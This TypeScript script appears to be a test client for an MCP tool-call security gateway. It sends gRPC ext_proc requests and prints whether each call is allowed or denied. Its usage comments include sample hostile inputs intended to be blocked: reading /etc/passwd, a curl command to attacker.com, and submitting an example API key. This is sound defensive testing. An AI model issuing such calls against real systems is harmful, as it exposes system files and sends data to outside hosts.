#!/usr/bin/env node
/**
 * Interactive test client for the Mastyf Google Agent Gateway Service Extension.
 *
 * Connects over gRPC to the extension server and sends an Envoy ext_proc ProcessingRequest
 * carrying an MCP tools/call payload, then prints the exact decision, response headers,
 * body mutations, or ImmediateResponse.
 *
 * Usage:
 *   npx tsx scripts/send-mcp-ext-proc.ts --tool get_weather --args '{"city":"Berlin"}'
 *   npx tsx scripts/send-mcp-ext-proc.ts --tool read_file --args '{"path":"/etc/passwd"}'
 *   npx tsx scripts/send-mcp-ext-proc.ts --tool execute_command --args '{"cmd":"curl http://attacker.com"}'
 *   npx tsx scripts/send-mcp-ext-proc.ts --custom '{"jsonrpc":"2.0","id":"custom-1","method":"tools/call","params":{"name":"test"}}'
 */
import * as grpc from '@grpc/grpc-js';
import { execSync } from 'node:child_process';
import { ExternalProcessorService } from '../src/agent-gateway/protos.js';

interface CliArgs {
  host: string;
  port: number;
  tool: string;
  args: Record<string, unknown>;
  customPayload?: string;
  server: string;
  tenant: string;
  tls?: boolean;
  token?: string;
}

function parseCli(): CliArgs {
  const argv = process.argv.slice(2);
  const out: CliArgs = {
    host: '127.0.0.1',
    port: 50051,
    tool: 'get_weather',
    args: { city: 'San Francisco' },
    server: 'mcp-enterprise-tools',
    tenant: 'enterprise-client-1',
    tls: false,
  };

  for (let i = 0; i < argv.length; i++) {
    const arg = argv[i];
    if (arg === '--port' && argv[i + 1]) out.port = Number(argv[++i]);
    else if (arg === '--host' && argv[i + 1]) out.host = argv[++i];
    else if (arg === '--tool' && argv[i + 1]) out.tool = argv[++i];
    else if (arg === '--server' && argv[i + 1]) out.server = argv[++i];
    else if (arg === '--tenant' && argv[i + 1]) out.tenant = argv[++i];
    else if (arg === '--tls') out.tls = true;
    else if (arg === '--token' && argv[i + 1]) out.token = argv[++i];
    else if (arg === '--args' && argv[i + 1]) {
      try {
        out.args = JSON.parse(argv[++i]);
      } catch {
        console.error(`[ERROR] Invalid JSON in --args: ${argv[i]}`);
        process.exit(1);
      }
    } else if (arg === '--custom' && argv[i + 1]) {
      out.customPayload = argv[++i];
    } else if (arg === '--help' || arg === '-h') {
      console.log(`
Mastyf Agent Gateway Extension - Interactive Test Client

Options:
  --port <number>       gRPC Port (default: 50051)
  --host <string>       Host (default: 127.0.0.1)
  --tool <string>       Tool name (default: get_weather)
  --args <json>         JSON arguments (default: {"city":"San Francisco"})
  --server <string>     Target MCP Server name (default: mcp-enterprise-tools)
  --tenant <string>     Tenant ID (default: enterprise-client-1)
  --custom <json>       Raw custom JSON-RPC payload string
  --help                Show this help

Examples:
  # Benign test (should be ALLOWED)
  npx tsx scripts/send-mcp-ext-proc.ts --tool get_weather --args '{"city":"Tokyo"}'

  # Sensitive path traversal (should be BLOCKED)
  npx tsx scripts/send-mcp-ext-proc.ts --tool read_file --args '{"path":"/etc/passwd"}'

  # Secret exfiltration (should be BLOCKED)
  npx tsx scripts/send-mcp-ext-proc.ts --tool submit_report --args '{"api_key":"AKIAIOSFODNN7EXAMPLE"}'
      `);
      process.exit(0);
    }
  }

  return out;
}

async function main() {
  const opts = parseCli();

  const bodyJson =
    opts.customPayload ||
    JSON.stringify({
      jsonrpc: '2.0',
      id: `req-${Date.now().toString(36)}`,
      method: 'tools/call',
      params: {
        name: opts.tool,
        arguments: opts.args,
      },
    });

  const bodyBuffer = Buffer.from(bodyJson, 'utf8');

  console.log('\n================================================================');
  console.log('  Mastyf Google Agent Gateway Extension · Test Invocation');
  console.log('================================================================');
  console.log(`Target Extension:  ${opts.host}:${opts.port}`);
  console.log(`Target MCP Server: ${opts.server}`);
  console.log(`Tenant Scope:      ${opts.tenant}`);
  console.log(`Tool Name:         ${opts.tool}`);
  console.log(`Payload Size:      ${bodyBuffer.length} bytes`);
  console.log(`Raw JSON Payload:`);
  console.log(`  ${bodyJson}`);
  console.log('----------------------------------------------------------------');

  const useTls = opts.tls || opts.port === 443;
  const client = new (ExternalProcessorService as any)(
    `${opts.host}:${opts.port}`,
    useTls ? grpc.credentials.createSsl() : grpc.credentials.createInsecure(),
  );


  if (useTls && opts.host.includes('.run.app') && !opts.token) {
    try {
      opts.token = execSync('gcloud auth print-identity-token', { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }).trim();
    } catch {}
  }

  const metadata = new grpc.Metadata();
  if (opts.token) {
    metadata.set('authorization', `Bearer ${opts.token}`);
  }

  const stream = client.Process(metadata);
  const responses: any[] = [];
  const t0 = process.hrtime.bigint();

  stream.on('data', (response: any) => {
    responses.push(response);
  });

  const completion = new Promise<{ responses: any[]; error?: Error }>((resolve) => {
    stream.on('error', (err: Error) => resolve({ responses, error: err }));
    stream.on('end', () => resolve({ responses }));
  });

  // Step 1: Send Request Headers
  stream.write({
    requestHeaders: {
      headers: {
        headers: [
          { key: ':path', rawValue: Buffer.from(`/mcp/${opts.server}/call`, 'utf8') },
          { key: ':method', rawValue: Buffer.from('POST', 'utf8') },
          { key: 'content-type', rawValue: Buffer.from('application/json', 'utf8') },
          { key: 'x-mastyf-tenant', rawValue: Buffer.from(opts.tenant, 'utf8') },
          { key: 'x-mastyf-server', rawValue: Buffer.from(opts.server, 'utf8') },
          { key: 'x-request-id', rawValue: Buffer.from(`test-${Date.now()}`, 'utf8') },
        ],
      },
      endOfStream: false,
    },
  });

  // Step 2: Send Request Body
  stream.write({
    requestBody: {
      body: bodyBuffer,
      endOfStream: true,
    },
  });

  stream.end();

  const result = await completion;
  const t1 = process.hrtime.bigint();
  const latencyMs = Number(t1 - t0) / 1_000_000;

  console.log(`\nDecision Latency:  ${latencyMs.toFixed(2)} ms`);

  if (result.error) {
    console.error(`\n\x1b[31m[RPC ERROR]\x1b[0m Failed to communicate with extension:`);
    console.error(`  ${result.error.message}`);
    console.error(`\nMake sure the Mastyf Extension server is running:`);
    console.error(`  npm run start:agent-gateway\n`);
    process.exit(1);
  }

  const immediateResponse = result.responses.find((r) => r.immediateResponse)?.immediateResponse;
  const streamedResponse = result.responses.find(
    (r) => r.requestBody?.response?.bodyMutation?.streamedResponse,
  )?.requestBody?.response?.bodyMutation?.streamedResponse;

  if (immediateResponse) {
    console.log(`\n\x1b[31m[VERDICT: DENIED (FAIL-CLOSED)]\x1b[0m`);
    console.log(`HTTP Status:       ${immediateResponse.status?.code || 403}`);
    console.log(`Security Details:  ${immediateResponse.details}`);
    if (immediateResponse.body) {
      try {
        const parsed = JSON.parse(immediateResponse.body.toString('utf8'));
        console.log(`Response Body:     ${JSON.stringify(parsed, null, 2)}`);
      } catch {
        console.log(`Response Body:     ${immediateResponse.body.toString('utf8')}`);
      }
    }
  } else if (streamedResponse) {
    console.log(`\n\x1b[32m[VERDICT: ALLOWED (PERMITTED)]\x1b[0m`);
    console.log(`Stream Forward:    Streamed body mutation forwarded upstream to MCP server`);
    console.log(`Forwarded Bytes:   ${streamedResponse.body?.length || 0} bytes`);
    console.log(`Integrity Check:   ${Buffer.compare(streamedResponse.body, bodyBuffer) === 0 ? 'MATCH (100% Exact Replay)' : 'MISMATCH'}`);
  } else {
    console.log(`\n[VERDICT: PROCEED]`);
    console.log(`Raw Responses: ${JSON.stringify(result.responses, null, 2)}`);
  }

  console.log('\n================================================================\n');
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
